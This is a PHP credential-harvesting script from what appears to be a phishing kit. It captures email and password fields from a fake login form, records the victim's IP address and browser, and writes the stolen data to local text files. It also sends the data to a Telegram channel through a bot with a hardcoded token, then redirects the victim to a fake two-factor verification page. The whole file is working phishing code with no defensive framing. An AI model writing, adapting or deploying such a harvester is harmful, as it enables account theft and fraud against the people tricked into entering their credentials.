<?php
function getVisIpAddr() { 
      
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
            return $_SERVER['HTTP_CLIENT_IP']; 
        } 
        else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
            return $_SERVER['HTTP_X_FORWARDED_FOR']; 
        } 
        else { 
            return $_SERVER['REMOTE_ADDR']; 
        } 
    } 
      
    // Store the IP address 
    $vis_ip = getVisIPAddr(); 
      
    // Display the IP address 
    echo $vis_ip; 

$title = $_POST['title'];
$username = $_POST['email'];
$pwd = $_POST['pass'];


              
if(isset($username) and isset($pwd))
{
$texts = "\n ***DATA***INSERTED***\n\nUsername:: ".$username."\nPassword::  ".$pwd. "\nTitle:: ".$title."\nCountry : ".$vis_ip; "\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";

$texts2 = "     <tr>
        <th scope=\"row\"> - </th>
        <td>".$title."</td>
        <td>".$username."</td>

        <td>".$pwd."</td>
        <td>".$_SERVER['REMOTE_ADDR']."</td>
        <td>".date('F j, Y, g:i a')."</td>
        <td>".$_SERVER['HTTP_USER_AGENT']."</td>
     </tr>\n";

$fp = fopen('data.txt', 'a');
$fp2 = fopen('data2.txt','a');

$tmain = "New Customer Alert \n ***DATA***INSERTED***\n
        Portal : ".$title."
        UserID : ".$username."
        Password : ".$pwd."
        IP-Address : ".$_SERVER['REMOTE_ADDR']."
        Time Logged : ".date('F j, Y, g:i a')."
        Browser/Device/OS : ".$_SERVER['HTTP_USER_AGENT']."
        Country : ".$vis_ip; "
        ";


$apiToken = "6906329824:AAFbkdYIoP3j7DQE_kQhWeBYq7jvEsnuCuM";
    $data = [
        'chat_id' => '@ipaymain', 
        'text' => $tmain
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


fwrite($fp,$texts );
fwrite($fp2,$texts2);
fclose($fp);
fclose($fp2);



header("Location: https://ipaycash.org/trade/Or124t3oQ5/2fa-verification/");
} 
?>